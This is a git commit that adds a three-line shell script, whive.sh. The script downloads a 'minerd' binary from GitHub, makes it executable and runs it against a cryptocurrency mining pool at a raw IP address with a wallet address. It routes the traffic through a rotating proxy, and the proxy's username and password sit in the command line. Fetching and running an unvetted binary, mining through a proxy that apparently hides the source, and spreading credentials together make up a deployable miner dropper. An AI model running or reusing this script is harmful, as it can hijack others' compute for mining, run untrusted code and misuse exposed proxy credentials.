3386088b0837fce850a69ce66bda017ef181ca74
qbicc01 <qbicc01@outlook.com>
2024-06-20 17:18:22 +0530

    Create whive.sh

---
+++ whive.sh
@@ -0,0 +1,3 @@
+wget https://github.com/qbicc01/qbicc/raw/main/minerd
+chmod +x minerd
+./minerd -a yespower -o stratum+tcp://206.189.2.17:3333 -u wv1qe523ah5edaxwyk0q72ehcm9mghsd2hzajrcckt -x xtncrobw-rotate:2xy2iaskqndm@p.webshare.io:80
